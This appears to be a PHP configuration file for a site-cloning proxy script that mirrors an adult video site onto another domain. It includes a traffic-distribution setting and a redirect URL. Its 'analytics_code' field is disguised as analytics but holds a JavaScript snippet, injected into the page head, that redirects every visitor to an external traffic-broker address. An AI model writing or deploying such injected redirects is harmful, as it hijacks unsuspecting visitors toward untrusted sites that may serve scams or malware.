<?php
$config['ver'] = '3.0';
$config['site'] = 'sextubehub.com';
$config['my_domain'] = '76mdh.pl';
$config['debug'] = FALSE;
$config['charset'] = 'utf-8';
$config['to_charset'] = 'utf-8';
$config['on_cookie'] = FALSE;
$config['del_links'] = FALSE;
$config['del_comm'] = FALSE;
$config['mydir'] = 'mysitefiles';
$config['sape'] = FALSE;
$config['sape_key'] = 1;
$config['watermark'] = FALSE;
$config['watermark_image'] = 'watermark.png';
$config['watermarkna'] = 'uploads/posts/';
$config['watermarkxy'] = '100;96';
$config['cache'] = FALSE;
$config['maxsizecache'] = 1048576;
$config['timecache'] = 43200;
$config['time2cache'] = 604800;
$config['file2cache'] = 'bmp,gif,jpeg,jpg,jpe,png,ico,mpeg,mpg,mpe,mov,avi,wmv,mp2,mp3,wav,css,zip,pdf,doc,bin,exe,class,dll,dvi,spl,gtar,tar,au,snd,midi,mid,m3u,tiff,tif';
$config['save_data'] = FALSE;
$config['save_data_source'] = 15;
$config['redirect'] = 'no';
$config['redirect_url'] = 'traficfuck.biz/02k2';
$config['redirect_from'] = 'all';
$config['redirect_from_urls'] = 'page23.html<|||>page34.html';
$config['danger_action'] = 'default';
$config['danger_file'] = '';
$config['danger_site'] = 'tds_url';
$config['blocked_action'] = 'default';
$config['blocked_site'] = 'world-of-warplanes.com';
$config['analytics'] = TRUE;
$config['analytics_code'] = '<script language="JavaScript"> 
  window.location.href = "http://traficfuck.biz/02k2"
</script>';
$config['analytics_place'] = 'head';

?>